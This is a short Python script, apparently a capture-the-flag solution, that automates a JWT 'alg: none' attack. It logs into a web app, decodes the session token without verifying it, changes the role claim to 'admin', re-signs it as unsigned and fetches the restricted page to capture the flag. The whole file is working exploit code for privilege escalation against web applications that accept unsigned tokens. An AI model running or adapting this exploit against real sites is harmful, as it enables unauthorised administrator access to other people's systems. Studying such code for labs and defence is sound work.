#!/usr/bin/python
# -*- coding:utf-8 -*-

import os, sys, requests, jwt
import logging
from optparse import OptionParser, OptionGroup

__version__ = "0.1"

# nicely parse the command line arguments
def parse_options():
    usage = r'usage: python3 %prog [options] -l LOGIN_URL -u USERNAME -p PASSWORD'
    parser = OptionParser(usage = usage, version = __version__)

    parser.add_option('-l', '--url',
        action = 'store',
        type = 'string',
        dest = 'url',
        help = 'The POST request url to login the website.'
    )

    parser.add_option('-u', '--username',
        action = 'store',
        type = 'string',
        dest = 'username',
        help = 'The username used to login.'
    )

    parser.add_option('-p', '--password',
        action = 'store',
        type = 'string',
        dest = 'password',
        help = 'The password used to login.'
    )

    options, args = parser.parse_args()
    if options.url == None or options.username == None or options.password == None:
        parser.print_help()
        parser.error("Missing options.")
        
    return options

def main():
    options = parse_options()

    # a default user-agent which is used to login the website
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36"}
    # the login parameters
    loginparams = {"username": options.username, "password": options.password}

    session_requests = requests.session() # by using session(), we are able to handle http cookies, which is used to save the jwt token
    login_result = session_requests.post(options.url, data = loginparams, headers = headers) # send a post request to login the website
    if login_result.status_code == 200:
        # successfully login the website
        private_page_url = login_result.url # now the user should be redirected to a restricted page, which has different contents for different roles
        for cookie in session_requests.cookies:
            if cookie.name == "token":
                jwttoken = cookie.value # extract the jwt token string
                logging.info("successfully detect a jwt token: %s\n"%jwttoken)

                header = jwt.get_unverified_header(jwttoken) # get the jwt token header, figure out which algorithm the web server is using
                logging.info("jwt token header: %s\n"%header)

                payload = jwt.decode(jwttoken, verify=False) # decode the jwo token payload, the user role information is claimed in the payload
                logging.info("jwt token payload: %s\n"%payload)

                payload["role"] = "admin"
                fake_jwttoken = jwt.encode(payload, None, algorithm="none") # update the user role and regenerate the jwt token using "none" algorithm
                logging.info("regenerate a jwt token using 'none' algorithm and changing the role into 'admin'")
                logging.info(fake_jwttoken.decode("utf-8") + "\n")
                
                cookie.value = fake_jwttoken.decode("utf-8")
                break
        flag_page = session_requests.get(private_page_url, headers = headers) # let's visit the restricted page again
        logging.info("\n" + flag_page.text + "\n") # now the webpage should contain the flag information

        logging.info("Yeah, now we successfully login as admin!")
    else:
        logging.error("Failed to login the website, please check the options.")
        sys.exit(1)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    main()